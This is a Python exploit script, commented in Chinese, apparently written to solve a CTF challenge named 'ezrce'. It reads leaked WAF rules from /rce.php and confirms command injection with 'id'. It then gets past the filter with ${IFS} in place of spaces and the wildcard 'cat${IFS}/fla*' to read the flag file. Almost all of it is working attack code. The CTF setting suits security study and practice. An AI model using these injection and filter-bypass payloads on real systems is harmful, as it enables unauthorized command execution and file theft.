#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""exp.py —— ezrce（命令注入 + WAF 绕过）

目标：http://d4u7tc77soq2scmf.neu-nex.fun/
链路：/rce.php 源码泄露 WAF 规则（拦 flag 与空格）→ system($cmd)
      空格用 ${IFS} 绕过；flag 关键字用通配符 fla* 绕过
依赖：仅标准库
用法：python exp.py [--url URL]
"""
import argparse
import html
import re
import sys
import urllib.parse
import urllib.request

UA = 'exp/1.0 (+authorized-ctf)'


def fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode('utf-8', 'replace')


def run(base, cmd):
    body = fetch(base + '/rce.php?cmd=' + urllib.parse.quote(cmd))
    t = re.sub(r'<br\s*/?>', '\n', body)
    t = re.sub(r'<[^>]+>', '', t)
    t = html.unescape(t)
    return t.split('<?php')[0].strip()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default='http://d4u7tc77soq2scmf.neu-nex.fun')
    args = ap.parse_args()
    base = args.url.rstrip('/')

    # 步骤 1：源码泄露，读出 WAF 规则
    src = fetch(base + '/rce.php')
    text = html.unescape(re.sub(r'<[^>]+>', '', src))
    print('[1] /rce.php 源码关键行:')
    for line in text.splitlines():
        if 'preg_match' in line or 'system' in line or 'cmd' in line:
            print('   ', line.strip())

    # 步骤 2：确认命令执行
    out = run(base, 'id')
    print(f'[2] cmd=id -> {out}')
    if 'uid=' not in out:
        print('[-] 命令执行不可用')
        return 1

    # 步骤 3：看根目录
    out = run(base, 'ls${IFS}/')
    print(f'[3] cmd=ls${{IFS}}/ -> {out.replace(chr(10), " ")}')

    # 步骤 4：绕过 WAF 读 flag
    payload = 'cat${IFS}/fla*'
    out = run(base, payload)
    print(f'[4] cmd={payload} -> {out}')
    m = re.search(r'nex\{[A-Za-z0-9_]+\}', out)
    if not m:
        print('[-] 未拿到 flag')
        return 1
    print(f'[+] FLAG: {m.group(0)}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
